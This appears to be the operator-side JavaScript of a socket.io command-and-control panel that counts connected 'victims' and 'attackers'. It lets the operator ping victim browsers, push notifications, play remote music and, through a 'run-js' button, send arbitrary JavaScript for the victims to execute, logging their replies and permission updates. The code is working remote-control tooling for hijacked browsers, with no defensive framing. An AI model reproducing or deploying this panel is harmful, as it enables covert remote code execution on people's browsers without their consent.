var socket = io();
socket.emit('conn', {
  role: 'attacker',
  userAgent: navigator.userAgent,
});

const logBox = document.querySelector('#log');
const log = (msg) => {
  const p = document.createElement('li');
  const date = new Date();
  // format date as hh:mm:ss with leading zeros
  const time = `${date.getHours().toString().padStart(2, '0')}:${date.getMinutes().toString().padStart(2, '0')}:${date.getSeconds().toString().padStart(2, '0')}`;
  p.textContent = `${time} -> ${msg}`;
  logBox.appendChild(p);

  // autoscroll
  logBox.scrollTop = logBox.scrollHeight;
};

socket.on('connect', () => {
  document.querySelector("#connection-status").textContent = `🌍 Connected`;
  log('[local] Connected');
});

socket.on('disconnect', () => {
  document.querySelector("#connection-status").textContent = `☠️ Disconnected`;
  log('[local] Disconnected');
});

socket.on('victims', (victims) => {
  document.querySelector("#victim-count").textContent = `${victims} victims`;
  log(`[server] Victims: ${victims}`);
});

socket.on('attackers', (attackers) => {
  document.querySelector("#attacker-count").textContent = `${attackers} attackers`;
  log(`[server] Attackers: ${attackers}`);
});

socket.on('new-conn', (info) => {
  log(`[server] New connection: ${JSON.stringify(info)}`);
});


document.querySelector("#ping").addEventListener('click', () => {
  socket.emit('ping');
  log('[local] Sent ping');
});
socket.on('pong', () => {
  log('[victim] Received pong');
});

const notificationText = document.querySelector("#notification-text");
document.querySelector("#notification-btn").addEventListener('click', () => {
  socket.emit('notification', notificationText.value);
  log(`[local] Sent notification: ${notificationText.value}`);
});

const musicUrl = document.querySelector("#music-url");
document.querySelector("#music-btn").addEventListener('click', () => {
  socket.emit('music', musicUrl.value);
  log(`[local] Sent music: ${musicUrl.value}`);
});
document.querySelector("#stop-music-btn").addEventListener('click', () => {
  socket.emit('stop-music');
  log(`[local] Stopped music`);
});

const javascriptCode = document.querySelector("#javascript");
document.querySelector("#run-js-btn").addEventListener('click', () => {
  socket.emit('run-js', javascriptCode.value);
  log(`[local] Sent javascript: ${javascriptCode.value}`)
});

socket.on('permission', (msg) => {
  log(`[victim] Received permission update: ${msg}`);
});

socket.on('notification', (msg) => {
  log(`[remote] Sent notification: ${msg}`);
});
socket.on('music', (url) => {
  log(`[remote] Sent music: ${url}`);
});
socket.on('stop-music', (url) => {
  log(`[remote] Stopped music`);
});
socket.on('run-js', (code) => {
  log(`[remote] Sent javascript: ${code}`)
});
